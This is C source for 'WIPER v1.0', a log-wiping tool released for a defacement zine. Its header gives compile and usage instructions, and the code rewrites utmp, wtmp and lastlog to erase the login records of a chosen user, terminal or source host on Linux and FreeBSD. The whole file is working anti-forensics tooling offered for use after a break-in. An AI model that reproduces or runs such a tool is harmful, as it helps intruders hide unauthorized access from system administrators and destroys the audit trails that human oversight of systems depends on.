/***********************************************************
      !!! SPECIAL RELEASE FOR DEFACED @ ZINE !!!

	WIPER v 1.0  for Linux and FreeBSD
					
  It's easy to use logwiper for wtmp/utmp/lastlog.

 Compile:
 - generic linux: 'gcc -o wiper wiper.c'
 
 - freebsd: 'gcc -o wiper -D_FREEBSD_ wiper.c'
 
 - if you dont need lastlog support: 
   'gcc -o wiper -D_NOLASTLOG_ wiper.c'

 - if you need to set manually path to wtmp:
   'gcc -o wiper -DWTMPF="/new/path2/wtmp" wiper.c'

 - if you need to set manually path to utmp:
   'gcc -o wiper -DUTMPF="/new/path2/utmp" wiper.c'

 - if you need to set manually path to lastlog:
   'gcc -o wiper -DLASTLOGF="/new/path2/lastlog" wiper.c'
 
 
 Tested on:
 - Linux:
    Mandrake 8.0
    RedHat 7.1
    RedHat 9.0 
    ASP 9.0    
    ALT Master 2.0
 - FreeBSD 5.0-RELEASE


 HowTo use:

 './wiper root tty2' - wipe all records, there root
 logged in from tty2. 

 './wiper lamah tty2 162.168.1.9' - wipe all entries from 
 host 162.168.1.9 for user lamah on tty2.

 './wiper lamah tty2 192.168.' - wipe all entries from hosts
 192.168.x.x for user lamah on tty2. So, Its just a _STRING_.
 
 './wiper lamah tty2 www.evil' - wipe all entries form hosts 
 with domain name "www.evil*" for user lamah on tty2.

      !!! SPECIAL RELEASE FOR DEFACED @ ZINE !!!
***********************************************************/


#ifndef  WTMPF 
#define  WTMPF      "/var/log/wtmp"
#endif

#ifndef  UTMPF
#define  UTMPF      "/var/run/utmp"
#endif

#ifndef _NOLASTLOG_

#ifndef LASTLOGF
#define  LASTLOGF   "/var/log/lastlog"
#endif

#endif

#include <stdio.h>
#include <unistd.h>
#include <utmp.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>

#ifdef _FREEBSD_
#define UTUSR	ut_name
#else
#include <lastlog.h>    
#define UTUSR	ut_user
#endif


void usage (char *pname);


int main (int argc, char *argv[])
{

int l,n,t;
struct  utmp	usr;
struct  lastlog lst;
struct  passwd *psw;
char cmd[40];

printf("   WIPEr v 1.0 (Linux and FreeBSD support) for DeFaceD @ zine\n");

    if (argc < 3){ 
	
	usage(argv[0]); 
	exit(0);
	 
    }

if (argc >= 4){ t=1;}

if ( (psw = getpwnam(argv[1])) == NULL )
    {

	printf("[-] Cant find user %s!\n",argv[1]);
	exit(-1);
    }


/*************  UTMP  **************/ 

if ((l = open(UTMPF,O_RDONLY)) < 0 )
    {
	printf("[-] Cant open %s!\n",UTMPF);
	exit(-1);
    }

n = open("ftmp",O_WRONLY | O_CREAT);

    while( read(l,&usr, sizeof(usr)) >0 )
    {

	if ( (strcmp(usr.UTUSR,argv[1]) == 0) && (strcmp(usr.ut_line,argv[2]) == 0)){
	    
	    if (t==1){
			
		if (strlen(argv[3]) < strlen(usr.ut_host)){   
		  
		    if (!(strncmp(usr.ut_host,argv[3],strlen(argv[3]))==0))
						    write(n, &usr, sizeof(usr));
		} else {
		    write(n, &usr, sizeof(usr));
		}
	    }	    	
	
	} else {
	 write(n,&usr,sizeof(usr));
	}
    
    } 

close(l);
close(n);

if ( system("cat ftmp > /var/run/utmp; rm -f ftmp") <0 )
    {
    printf("[-] Cant move newlog to %s (its now in ftmp)!\n",UTMPF);
    exit(-1);
    }

printf("[+] utmp done\n");

/*************  WTMP  **************/ 

if ( (l = open(WTMPF,O_RDONLY)) < 0 )
    {
	printf("[-] Cant open %s!\n",WTMPF);
	exit(-1);
    }

n = open("ftmp2",O_WRONLY | O_CREAT);

    while( read(l,&usr, sizeof(usr)) >0 )
    {

	if ( (strcmp(usr.UTUSR,argv[1]) == 0) && (strcmp(usr.ut_line,argv[2]) == 0)){
	    
	    if (t==1){
			
		if (strlen(argv[3]) < strlen(usr.ut_host)){   
		  
		    if (!(strncmp(usr.ut_host,argv[3],strlen(argv[3]))==0))
						    write(n, &usr, sizeof(usr));
		}
	    
	    }	    	
	
	} else {
	 write(n,&usr,sizeof(usr));
	}
    
    }  

close(l);
close(n);

if ( system("cat ftmp2 > /var/log/wtmp; rm -f ftmp2") <0 )
    {
    printf("[-] Cant move newlog to %s (its now in ftmp2)!\n",WTMPF);
    exit(-1);
    }

printf("[+] wtmp done\n");

#ifndef _NOLASTLOG_

/*************  LASTLOG  **************/ 

if ( (l = open(LASTLOGF,O_RDWR)) < 0 )
    {
	printf("[-] Cant open %s!\n",LASTLOGF);
	exit(-1);
    }

    
lseek(l, sizeof(lst)*psw->pw_uid, SEEK_SET);
read(l, &lst, sizeof(lst));

lst.ll_time=0;
strcpy(lst.ll_line,"  ");
strcpy(lst.ll_host,"  ");

lseek(l, sizeof(lst)*psw->pw_uid, SEEK_SET);
write(l, &lst, sizeof(lst));
close(l);

sprintf(cmd,"chmod 644 %s",LASTLOGF);
system(cmd);

printf("[+] lastlog done\n");
#endif

} 



void usage (char *pname)
{

printf("\n Usage: %s  <user>  <tty>  [<host>]\n\n",pname);

}


